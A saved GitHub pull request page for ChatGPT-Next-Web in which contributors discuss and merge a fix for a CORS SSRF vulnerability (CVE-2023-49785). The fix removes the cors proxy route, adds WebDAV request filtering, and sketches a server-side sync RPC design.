=== Content from github.com_ce913a51_20250110_115325.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FChatGPTNextWeb%2FChatGPT-Next-Web%2Fpull%2F4285)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FChatGPTNextWeb%2FChatGPT-Next-Web%2Fpull%2F4285)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=ChatGPTNextWeb%2FChatGPT-Next-Web)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ChatGPTNextWeb](/ChatGPTNextWeb)
/
**[ChatGPT-Next-Web](/ChatGPTNextWeb/ChatGPT-Next-Web)**
Public

* [Notifications](/login?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web) You must be signed in to change notification settings
* [Fork
  60k](/login?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web)
* [Star
   78.5k](/login?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web)

* [Code](/ChatGPTNextWeb/ChatGPT-Next-Web)
* [Issues
  484](/ChatGPTNextWeb/ChatGPT-Next-Web/issues)
* [Pull requests
  75](/ChatGPTNextWeb/ChatGPT-Next-Web/pulls)
* [Discussions](/ChatGPTNextWeb/ChatGPT-Next-Web/discussions)
* [Actions](/ChatGPTNextWeb/ChatGPT-Next-Web/actions)
* [Projects
  1](/ChatGPTNextWeb/ChatGPT-Next-Web/projects)
* [Security](/ChatGPTNextWeb/ChatGPT-Next-Web/security)
* [Insights](/ChatGPTNextWeb/ChatGPT-Next-Web/pulse)

Additional navigation options

* [Code](/ChatGPTNextWeb/ChatGPT-Next-Web)
* [Issues](/ChatGPTNextWeb/ChatGPT-Next-Web/issues)
* [Pull requests](/ChatGPTNextWeb/ChatGPT-Next-Web/pulls)
* [Discussions](/ChatGPTNextWeb/ChatGPT-Next-Web/discussions)
* [Actions](/ChatGPTNextWeb/ChatGPT-Next-Web/actions)
* [Projects](/ChatGPTNextWeb/ChatGPT-Next-Web/projects)
* [Security](/ChatGPTNextWeb/ChatGPT-Next-Web/security)
* [Insights](/ChatGPTNextWeb/ChatGPT-Next-Web/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FChatGPTNextWeb%2FChatGPT-Next-Web%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# [Bugfix] Fix CORS SSRF security issue #4285

 Merged

[fred-bf](/fred-bf)
merged 7 commits into
[ChatGPTNextWeb:main](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main "ChatGPTNextWeb/ChatGPT-Next-Web:main")
from
[fred-bf:fix/cors-ssrf](/fred-bf/ChatGPT-Next-Web/tree/fix/cors-ssrf "fred-bf/ChatGPT-Next-Web:fix/cors-ssrf")

Mar 13, 2024

 Merged

# [[Bugfix] Fix CORS SSRF security issue](#top) #4285

[fred-bf](/fred-bf)
merged 7 commits into
[ChatGPTNextWeb:main](/ChatGPTNextWeb/ChatGPT-Next-Web/tree/main "ChatGPTNextWeb/ChatGPT-Next-Web:main")
from
[fred-bf:fix/cors-ssrf](/fred-bf/ChatGPT-Next-Web/tree/fix/cors-ssrf "fred-bf/ChatGPT-Next-Web:fix/cors-ssrf")

Mar 13, 2024

[Conversation
18](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285)
[Commits
7](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits)
[Checks
3](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/checks)
[Files changed](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![fred-bf](https://avatars.githubusercontent.com/u/157469842?s=60&v=4)](/fred-bf)

Copy link

Contributor

### @fred-bf **[fred-bf](/fred-bf)** commented [Mar 13, 2024](#issue-2184372665) • edited Loading

Fix CORS SSRF security issue reported by: [#4283](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/4283)

* Migrate Upstash API
* Migrate WebDAV API
* Remove request to `CORS` api

Sorry, something went wrong.

All reactions

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)

`[fix: adjust upstash api](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/9a8497299d11706f096a4fc10ff0ab5af43465c7 "fix: adjust upstash api")`

`[9a84972](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/9a8497299d11706f096a4fc10ff0ab5af43465c7)`

[![@vercel](https://avatars.githubusercontent.com/in/8329?s=80&v=4)](/apps/vercel)
[![Vercel](https://avatars.githubusercontent.com/in/8329?s=40&u=cd19897a18dc3e7a2b0b8be2c6ce135b726c5772&v=4)](https://github.com/apps/vercel)

Copy link

### **[vercel](/apps/vercel) bot** commented [Mar 13, 2024](#issuecomment-1994785034)

| [@fred-bf](https://github.com/fred-bf) is attempting to deploy a commit to the **NextChat** Team on [Vercel](https://vercel.com).  A member of the Team first needs to [authorize it](https://vercel.com/git/authorize?team=NextChat&type=github&job=%7B%22headInfo%22%3A%7B%22sha%22%3A%229a8497299d11706f096a4fc10ff0ab5af43465c7%22%7D%2C%22id%22%3A%22QmVdoaYpiagCZLcM8muhbszeMeKAcoTzHcTVxp2B4QuXwS%22%2C%22org%22%3A%22ChatGPTNextWeb%22%2C%22prId%22%3A4285%2C%22repo%22%3A%22ChatGPT-Next-Web%22%7D). |
| --- |

All reactions

Sorry, something went wrong.

 [![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)
[fred-bf](/fred-bf)
requested a review
from [Yidadaa](/Yidadaa)
[March 13, 2024 16:02](#event-12105854069)

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)
[fred-bf](/fred-bf)
self-assigned this
[Mar 13, 2024](#event-12105864557)

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=80&v=4)](/apps/github-actions)
[![GitHub Actions](https://avatars.githubusercontent.com/in/15368?s=40&u=167a342ed94d2a713daf64a8b476ead2cebe1852&v=4)](https://github.com/apps/github-actions)

Copy link

Contributor

### **[github-actions](/apps/github-actions) bot** commented [Mar 13, 2024](#issuecomment-1994795717)

| Your build has completed!  [Preview deployment](https://4285-vercelpreviewdeployment.pr.nextchat.dev) |
| --- |

All reactions

Sorry, something went wrong.

[![@H0llyW00dzZ](https://avatars.githubusercontent.com/u/17626300?s=80&u=104ae2435dc71b28482382b4ebae817e56bfc5c3&v=4)](/H0llyW00dzZ)

Copy link

Contributor

### **[H0llyW00dzZ](/H0llyW00dzZ)** commented [Mar 13, 2024](#issuecomment-1994810117)

| by the way, for the webdav its difficult to filter |
| --- |

 👍
1
 jokester reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=80&v=4)](/fred-bf)

Copy link

Contributor

Author

### **[fred-bf](/fred-bf)** commented [Mar 13, 2024](#issuecomment-1994853326)

| by the way, for the webdav its difficult to filter  My current idea is to filter requests by folder and fileName |
| --- |

All reactions

Sorry, something went wrong.

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=80&v=4)](/fred-bf)

Copy link

Contributor

Author

### **[fred-bf](/fred-bf)** commented [Mar 13, 2024](#issuecomment-1994859929)

| the folder name cannot be changed by user right now |
| --- |

All reactions

Sorry, something went wrong.

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)

`[fix: add webdav request filter](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/038fa3b301794050ec7e59325aa00f25b3ce3257 "fix: add webdav request filter")`

`[038fa3b](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/038fa3b301794050ec7e59325aa00f25b3ce3257)`

[![@H0llyW00dzZ](https://avatars.githubusercontent.com/u/17626300?s=80&u=104ae2435dc71b28482382b4ebae817e56bfc5c3&v=4)](/H0llyW00dzZ)

Copy link

Contributor

### **[H0llyW00dzZ](/H0llyW00dzZ)** commented [Mar 13, 2024](#issuecomment-1994920999)

| by the way, for the webdav its difficult to filter  My current idea is to filter requests by folder and fileName  There's another approach beyond using folder/fileName.  This approach involves:  Verifying methods for requests. Then, in this [`one`](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/app/api/cors/%5B...path%5D/route.ts), apply it exclusively only for syncing WebDAV, Upstah, or others syncing that for implementing in future.  Ref:   * <https://easy-software.com/en/glossary/webdav-protocol/> |
| --- |

All reactions

Sorry, something went wrong.

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=80&v=4)](/fred-bf)

Copy link

Contributor

Author

### **[fred-bf](/fred-bf)** commented [Mar 13, 2024](#issuecomment-1994948325)

| by the way, for the webdav its difficult to filter  My current idea is to filter requests by folder and fileName  There's another approach beyond using folder/fileName.  This approach involves:  Verifying methods for requests. Then, in this [`one`](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/app/api/cors/%5B...path%5D/route.ts), apply it exclusively only for syncing WebDAV, Upstah, or others syncing that for implementing in future.  Ref:   * <https://easy-software.com/en/glossary/webdav-protocol/>  Yes, it is indeed easier to maintain from a development perspective. I'm worried that the loopholes here may be overlooked in the future if we put them all together. It would be more intuitive for each specific interface to maintain the forwarding capability separately. |
| --- |

All reactions

Sorry, something went wrong.

[![@H0llyW00dzZ](https://avatars.githubusercontent.com/u/17626300?s=80&u=104ae2435dc71b28482382b4ebae817e56bfc5c3&v=4)](/H0llyW00dzZ)

Copy link

Contributor

### **[H0llyW00dzZ](/H0llyW00dzZ)** commented [Mar 13, 2024](#issuecomment-1994973013)

| by the way, for the webdav its difficult to filter  My current idea is to filter requests by folder and fileName  There's another approach beyond using folder/fileName. This approach involves: Verifying methods for requests. Then, in this [`one`](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/app/api/cors/%5B...path%5D/route.ts), apply it exclusively only for syncing WebDAV, Upstah, or others syncing that for implementing in future. Ref:   * <https://easy-software.com/en/glossary/webdav-protocol/>  Yes, it is indeed easier to maintain from a development perspective. I'm worried that the loopholes here may be overlooked in the future if we put them all together. It would be more intuitive for each specific interface to maintain the forwarding capability separately.  No need to worry, it's possible to modularize it separately, like this example:  [image](https://private-user-images.githubusercontent.com/17626300/312550446-6923ad97-2187-4204-b3b6-572a853a4e43.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTAzMDQsIm5iZiI6MTczNjUxMDAwNCwicGF0aCI6Ii8xNzYyNjMwMC8zMTI1NTA0NDYtNjkyM2FkOTctMjE4Ny00MjA0LWIzYjYtNTcyYTg1M2E0ZTQzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDExNTMyNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWMyYzc0NTQzYzk0M2I1MDcyNTRhZDRkZDJjMzIzZTdmODg2N2MwMDY5YmM2ZWIzNjdjMTgwN2IyYzc1MWI4MzImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.zbey4PBYfXk6bEPNDA3cJmQPVQIHuR9laau2mCXV-TE)  That method switch golang |
| --- |

All reactions

Sorry, something went wrong.

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)

`[fix: remove corsFetch](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/eebc334e02e9f5d9f83203c97fbf4622a9141d0a "fix: remove corsFetch")`

`[eebc334](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/eebc334e02e9f5d9f83203c97fbf4622a9141d0a)`

[![jokester](https://avatars.githubusercontent.com/u/802130?s=60&v=4)](/jokester)

**[jokester](/jokester)**
reviewed
[Mar 13, 2024](#pullrequestreview-1934757586)

 [View reviewed changes](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/files/eebc334e02e9f5d9f83203c97fbf4622a9141d0a)

[app/api/upstash/[action]/[...key]/route.ts](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/files/eebc334e02e9f5d9f83203c97fbf4622a9141d0a#diff-fdaae158fa25c6ab2e6937089c510327d9847f8004c4560f33a09bc53a513116)
Outdated

Show resolved

Hide resolved

 [![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)
[fred-bf](/fred-bf)
requested a review
from [jokester](/jokester)
[March 13, 2024 17:25](#event-12106915539)

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)

`[fix: change matching pattern](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/86452146540a224a3242238dd07964a26b8df246 "fix: change matching pattern")`

`[8645214](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/86452146540a224a3242238dd07964a26b8df246)`

 [![@fredliang44](https://avatars.githubusercontent.com/u/22412638?s=40&u=3d9527da2691f5b4f7257afdc96ef28431545f89&v=4)](/fredliang44)
[fredliang44](/fredliang44)
[force-pushed](/ChatGPTNextWeb/ChatGPT-Next-Web/compare/1919e76a160f4123f90b7e2c2ca0c77b785a66ad..86452146540a224a3242238dd07964a26b8df246)
the
fix/cors-ssrf

branch
from
[`1919e76`](/ChatGPTNextWeb/ChatGPT-Next-Web/commit/1919e76a160f4123f90b7e2c2ca0c77b785a66ad) to
[`8645214`](/ChatGPTNextWeb/ChatGPT-Next-Web/commit/86452146540a224a3242238dd07964a26b8df246)  [Compare](/ChatGPTNextWeb/ChatGPT-Next-Web/compare/1919e76a160f4123f90b7e2c2ca0c77b785a66ad..86452146540a224a3242238dd07964a26b8df246)
[March 13, 2024 17:26](#event-12106926071)

[![@vercel](https://avatars.githubusercontent.com/in/8329?s=80&v=4)](/apps/vercel)
[![Vercel](https://avatars.githubusercontent.com/in/8329?s=40&u=cd19897a18dc3e7a2b0b8be2c6ce135b726c5772&v=4)](https://github.com/apps/vercel)

Copy link

### **[vercel](/apps/vercel) bot** commented [Mar 13, 2024](#issuecomment-1995097988) • edited Loading

|  |  |  |  |  |  |  |  |  |  |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| **The latest updates on your projects**. Learn more about [Vercel for Git ↗︎](https://vercel.link/github-learn-more)   | Name | Status | Preview | Comments | Updated (UTC) | | --- | --- | --- | --- | --- | | **nextchat** | ✅ Ready ([Inspect](https://vercel.com/nextchat/nextchat/G1kCK7dp8Caiko8y7zrXnpB2svym)) | [Visit Preview](https://vercel.live/open-feedback/nextchat-git-fork-fred-bf-fix-cors-ssrf-nextchat.vercel.app?via=pr-comment-visit-preview-link&passThrough=1) | 💬 [**Add feedback**](https://vercel.live/open-feedback/nextchat-git-fork-fred-bf-fix-cors-ssrf-nextchat.vercel.app?via=pr-comment-feedback-link) | Mar 13, 2024 6:22pm | |

All reactions

Sorry, something went wrong.

 [![@vercel](https://avatars.githubusercontent.com/in/8329?s=40&v=4)](/apps/vercel)
[vercel](/apps/vercel)
bot
[deployed](https://nextchat-8xo5qnsni-nextchat.vercel.app "Deployment has completed")
to
[Preview](https://nextchat-8xo5qnsni-nextchat.vercel.app)
[March 13, 2024 17:31](#event-12106984322)
[View deployment](https://nextchat-8xo5qnsni-nextchat.vercel.app)

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)

`[chore: update cors default path](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/133ce39a13cb90733bc0aac220ea179e34fd4430 "chore: update cors default path")`

`[133ce39](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/133ce39a13cb90733bc0aac220ea179e34fd4430)`

[![jokester](https://avatars.githubusercontent.com/u/802130?s=60&v=4)](/jokester)

**[jokester](/jokester)**
approved these changes
[Mar 13, 2024](#pullrequestreview-1934824187)

 [View reviewed changes](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/files/133ce39a13cb90733bc0aac220ea179e34fd4430)

Copy link

### @jokester **[jokester](/jokester)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

lgtm!!!

This should make it much harder to do bad things with `upstash` / `webdav` APIs.

for `app/api/cors/[...path]/route.ts` I suppose some fix is still needed.

Sorry, something went wrong.

All reactions

[![@Yidadaa](https://avatars.githubusercontent.com/u/16968934?s=80&u=c98e4b11a628e0d18b7774d62dd5c5da9b9dedd3&v=4)](/Yidadaa)

Copy link

Collaborator

### **[Yidadaa](/Yidadaa)** commented [Mar 13, 2024](#issuecomment-1995145175)

| Let's turn it into a RPC, here is a proposal:  ``` type WebDavConfig = {   type: 'webdav',   endpoint: string,   username: string,   password: string }  type UpstashConfig = {   type: 'upstash',   endpoint: string,   username: STORAGE_KEY,   apiKey: string }  type SyncAction = {   type: 'check' } | {   type: 'get',   key: string, } | {   type: 'set',   key: string,   value: string }  type SyncPayload = {   config: WebDavConfig | UpstashConfig,   action: SyncAction }  // client side function createUpstashClient() {   return async check() {     return await call('/api/sync', { /* webdav config */ })   },   // get(key), set(key, value) }  // server side, /api/sync/route.ts async function handle(req) {   const payload = JSON.parse(await req.json()) as SyncPayload;    // dispatch payload to server side check/get/set actions } ```  The main idea is to move all the sync actions that were previously done on the client side to the server side. The downside is that the desktop app can no longer use the sync feature unless we keep the official sync endpoint built in. |
| --- |

 👍
1
 jokester reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

 [fred-bf](/fred-bf)
added 2 commits
[March 14, 2024 01:56](#commits-pushed-6aaf83f)

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)

`[fix: fix upstash sync issue](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/6aaf83f3c211b3efea63d20f39a58f0c1ab6fa17 "fix: fix upstash sync issue")`

`[6aaf83f](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/6aaf83f3c211b3efea63d20f39a58f0c1ab6fa17)`

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)

`[fix: fix webdav sync issue](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/99aa064319991b6ee53eb9c75bcfeb5a6b0188cb "fix: fix webdav sync issue")`

`[99aa064](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285/commits/99aa064319991b6ee53eb9c75bcfeb5a6b0188cb)`

[![@jokester](https://avatars.githubusercontent.com/u/802130?s=80&v=4)](/jokester)

Copy link

### **[jokester](/jokester)** commented [Mar 13, 2024](#issuecomment-1995198867)

| move all the sync actions that were previously done on the client side to the server side  Does that mean `/cors` API can be removed ? Because I don't see its other uses if browser can do sync without CORS-capable storage backends. |
| --- |

All reactions

Sorry, something went wrong.

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=80&v=4)](/fred-bf)

Copy link

Contributor

Author

### **[fred-bf](/fred-bf)** commented [Mar 13, 2024](#issuecomment-1995202728)

| fix: remove corsFetch  cors api already removed in commit [eebc334](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/commit/eebc334e02e9f5d9f83203c97fbf4622a9141d0a) |
| --- |

 👍
1
 jokester reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=80&v=4)](/fred-bf)

Copy link

Contributor

Author

### **[fred-bf](/fred-bf)** commented [Mar 13, 2024](#issuecomment-1995214892)

| [@Yidadaa](https://github.com/Yidadaa) for native client we can use tauri's http client to perform request without CORS issue. but it may take a while to refactor the code. My idea is that we release a patch version first, and then migrate the whole thing to the new interface. |
| --- |

All reactions

Sorry, something went wrong.

[![@H0llyW00dzZ](https://avatars.githubusercontent.com/u/17626300?s=80&u=104ae2435dc71b28482382b4ebae817e56bfc5c3&v=4)](/H0llyW00dzZ)

Copy link

Contributor

### **[H0llyW00dzZ](/H0llyW00dzZ)** commented [Mar 13, 2024](#issuecomment-1995217868)

| Let's turn it into a RPC, here is a proposal:  ``` type WebDavConfig = {   type: 'webdav',   endpoint: string,   username: string,   password: string }  type UpstashConfig = {   type: 'upstash',   endpoint: string,   username: STORAGE_KEY,   apiKey: string }  type SyncAction = {   type: 'check' } | {   type: 'get',   key: string, } | {   type: 'set',   key: string,   value: string }  type SyncPayload = {   config: WebDavConfig | UpstashConfig,   action: SyncAction }  // client side function createUpstashClient() {   return async check() {     return await call('/api/sync', { /* webdav config */ })   },   // get(key), set(key, value) }  // server side, /api/sync/route.ts async function handle(req) {   const payload = JSON.parse(await req.json()) as SyncPayload;    // dispatch payload to server side check/get/set actions } ```  The main idea is to move all the sync actions that were previously done on the client side to the server side. The downside is that the desktop app can no longer use the sync feature unless we keep the official sync endpoint built in.  It would be better to keep the official sync that can be used in the desktop app because it is more secure and safe (essentially built-in and isolated) in the desktop environment. |
| --- |

All reactions

Sorry, something went wrong.

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)
[fred-bf](/fred-bf)
linked an issue
[Mar 13, 2024](#event-12107391439)
that may be
closed
by this pull request

[[Bug] NextChat cors SSRF 漏洞（CVE-2023-49785）
#4283](/ChatGPTNextWeb/ChatGPT-Next-Web/issues/4283)

Closed

 [![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)
[fred-bf](/fred-bf)
marked this pull request as ready for review
[March 13, 2024 18:21](#event-12107519736)

 [![@vercel](https://avatars.githubusercontent.com/in/8329?s=40&v=4)](/apps/vercel)
[vercel](/apps/vercel)
bot
[deployed](https://nextchat-km4nspt18-nextchat.vercel.app "Deployment has completed")
to
[Preview](https://nextchat-km4nspt18-nextchat.vercel.app)
[March 13, 2024 18:22](#event-12107530440)
[View deployment](https://nextchat-km4nspt18-nextchat.vercel.app)

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)
[fred-bf](/fred-bf)
mentioned this pull request
[Mar 13, 2024](#ref-issue-2184639503)

[[Feature Request]: Switching to unified sync protocol and using tauri http package for native client
#4286](/ChatGPTNextWeb/ChatGPT-Next-Web/issues/4286)

Open

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=80&v=4)](/fred-bf)

Copy link

Contributor

Author

### **[fred-bf](/fred-bf)** commented [Mar 13, 2024](#issuecomment-1995292693)

| Merge the current PR first, and if there is any other questions, you could comment here or file a new issue |
| --- |

All reactions

Sorry, something went wrong.

 Hide details
View details

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)
[fred-bf](/fred-bf)
merged commit [`a22141c`](/ChatGPTNextWeb/ChatGPT-Next-Web/commit/a22141c2ebd8d68d596073dd792cd71314110351)
into
ChatGPTNextWeb:main

[Mar 13, 2024](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285#event-12107586924)
3 checks passed

[gaogao1030](/gaogao1030)
pushed a commit
to gaogao1030/ChatGPT-Next-Web
that referenced
this pull request
[May 16, 2024](#ref-commit-5e99510)
[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)

`[Merge pull request](/gaogao1030/ChatGPT-Next-Web/commit/5e99510eff8678a296a60f79363d7391e7ffbac6 "Merge pull request #4285 from fred-bf/fix/cors-ssrf

[Bugfix] Fix CORS SSRF security issue") [ChatGPTNextWeb#4285](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285) [from fred-bf/fix/cors-ssrf](/gaogao1030/ChatGPT-Next-Web/commit/5e99510eff8678a296a60f79363d7391e7ffbac6 "Merge pull request #4285 from fred-bf/fix/cors-ssrf

[Bugfix] Fix CORS SSRF security issue")`
…

`[5e99510](/gaogao1030/ChatGPT-Next-Web/commit/5e99510eff8678a296a60f79363d7391e7ffbac6)`

```
[Bugfix] Fix CORS SSRF security issue
```

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FChatGPTNextWeb%2FChatGPT-Next-Web%2Fpull%2F4285)

Reviewers

[![@jokester](https://avatars.githubusercontent.com/u/802130?s=40&v=4)](/jokester) [jokester](/jokester)

jokester approved these changes

[![@Yidadaa](https://avatars.githubusercontent.com/u/16968934?s=40&v=4)](/Yidadaa) [Yidadaa](/Yidadaa)

 Awaiting requested review from Yidadaa

Assignees

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf) [fred-bf](/fred-bf)

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

 [[Bug] NextChat cors SSRF 漏洞（CVE-2023-49785）](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/issues/4283)

4 participants

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=52&v=4)](/fred-bf) [![@H0llyW00dzZ](https://avatars.githubusercontent.com/u/17626300?s=52&v=4)](/H0llyW00dzZ) [![@Yidadaa](https://avatars.githubusercontent.com/u/16968934?s=52&v=4)](/Yidadaa) [![@jokester](https://avatars.githubusercontent.com/u/802130?s=52&v=4)](/jokester)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
